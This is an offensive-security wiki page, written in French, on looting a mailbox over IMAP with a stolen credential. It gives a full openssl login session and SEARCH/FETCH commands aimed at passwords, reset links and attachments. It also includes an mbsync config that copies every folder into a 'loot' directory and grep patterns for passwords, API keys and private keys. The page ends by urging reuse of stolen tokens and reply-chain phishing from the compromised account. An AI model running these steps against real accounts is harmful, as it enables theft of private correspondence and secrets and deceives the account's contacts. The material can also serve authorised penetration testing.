---
title: "Accès à la boîte aux lettres : lire et piller le courrier via IMAP"
description: "Piloter une session IMAP authentifiée pour le butin : LIST pour cartographier les dossiers, SELECT pour ouvrir une boîte, SEARCH pour trouver le courrier contenant des identifiants, et FETCH pour récupérer les en-têtes et les corps complets. Vide le courrier dans une session guidée, cherche les secrets au grep, et exporte en masse chaque dossier avec mbsync, offlineimap ou himalaya."
keywords:
  - imap fetch
  - imap search
  - mail harvesting
  - mbsync
  - reply-chain phishing
---

# Accès à la boîte aux lettres

Un identifiant valide transforme IMAP en une copie interrogeable de tout ce que le compte a jamais classé. Le protocole est conçu pour exactement les opérations que vous recherchez : `LIST` cartographie les dossiers, `SELECT` en ouvre un, `SEARCH` trouve les messages par contenu ou par en-tête, et `FETCH` récupère les en-têtes ou les corps entiers. Les boîtes aux lettres comptent parmi les sources de butin les plus riches d'un réseau : identifiants en clair, liens de réinitialisation de mot de passe et d'enrôlement MFA, courrier de configuration VPN et wifi, documents internes en pièces jointes, et chaînes de réponses complètes qui rendent le hameçonnage ultérieur impossible à distinguer d'une correspondance réelle.

## Prérequis

Une session authentifiée ([authentification](authentication.md)). Maintenez la session sur le port 993 ou STARTTLS afin que le courrier récupéré ne soit pas recopié vers quiconque se trouve sur le chemin.

## Session guidée

```bash
openssl s_client -connect <target>:993 -quiet
a LOGIN alice 'Sprint2025!'
a OK Logged in
a LIST "" "*"
* LIST (\HasNoChildren) "/" INBOX
* LIST (\HasNoChildren) "/" Sent
* LIST (\HasNoChildren) "/" "Archive/2024"
a OK List completed
a SELECT INBOX
* 1240 EXISTS
a OK [READ-WRITE] Select completed
a SEARCH OR OR SUBJECT "password" BODY "password" BODY "credential"
* SEARCH 14 221 889 1203
a OK Search completed
a FETCH 1203 (BODY[HEADER.FIELDS (FROM SUBJECT DATE)])
* 1203 FETCH (BODY[HEADER.FIELDS (FROM SUBJECT DATE)] {84}
From: it-helpdesk@corp.local
Subject: Your temporary VPN password
Date: Mon, 22 Sep 2025 09:11:04 +0000
)
a FETCH 1203 (BODY[TEXT])
```

Lisez les nombres : `SELECT` indique `EXISTS` (le nombre de messages) pour que vous connaissiez la plage pour `1:*`. `SEARCH` renvoie une liste de numéros de séquence séparés par des espaces correspondant aux critères ; injectez-les directement dans `FETCH`. `BODY[HEADER.FIELDS (...)]` ne récupère que les en-têtes choisis (un tri peu coûteux sur des milliers de messages), et `BODY[TEXT]` ou `BODY[]` récupère le corps ou l'intégralité du message RFC822, pièces jointes comprises. Le `{84}` est un préfixe de longueur de littéral qui indique combien d'octets de littéral suivent.

Critères `SEARCH` à forte valeur :

```
a SEARCH BODY "password"
a SEARCH SUBJECT "reset"
a SEARCH BODY "https://"                 # reset / enrollment / SSO links
a SEARCH HEADER "Content-Type" "application/"   # messages carrying attachments
a SEARCH SINCE 1-Jan-2025 FROM "helpdesk"
```

## Export en masse et tri hors ligne

Récupérer message par message convient aux recherches ciblées ; pour un compte entier, répliquez une fois chaque dossier sur le disque et cherchez au grep en local.

```bash
# mbsync (isync): one pull of all folders into a Maildir
cat > ~/.mbsyncrc <<'EOF'
IMAPAccount loot
Host <target>
Port 993
User alice
Pass Sprint2025!
TLSType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt
IMAPStore loot-remote
Account loot
MaildirStore loot-local
Path ~/loot/alice/
Inbox ~/loot/alice/INBOX
Channel loot
Far :loot-remote:
Near :loot-local:
Patterns *
EOF
mbsync loot

# then mine the Maildir
grep -rniE 'password|passwd|secret|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE KEY' ~/loot/alice/ | head
```

`offlineimap -o` effectue la même synchronisation complète en une passe, et `himalaya` (un client IMAP en ligne de commande) est pratique pour des lectures interactives ponctuelles : `himalaya -u alice -p 993 ... list` puis `read <id>`. Parmi les dossiers, `Sent` et `Archive` offrent généralement plus de butin qu'`INBOX`, puisque le courrier envoyé contient les identifiants sortants de l'utilisateur et des secrets partagés.

## Suites

Exploitez les identifiants et jetons récupérés pour une réutilisation immédiate contre d'autres services. Utilisez les véritables chaînes de réponses récupérées ici pour monter un hameçonnage par chaîne de réponses depuis le compte compromis (accès en écriture via la soumission SMTP), et cartographiez les relations internes à partir de `From`/`To`/`Cc` pour le prochain pivot.

## Outils

- [isync / mbsync](https://isync.sourceforge.io/)
- [OfflineIMAP](https://www.offlineimap.org/)
- [himalaya](https://github.com/pimalaya/himalaya)

## Références

- [RFC 3501 : FETCH et SEARCH](https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.4)
- [HackTricks : pentesting IMAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html)
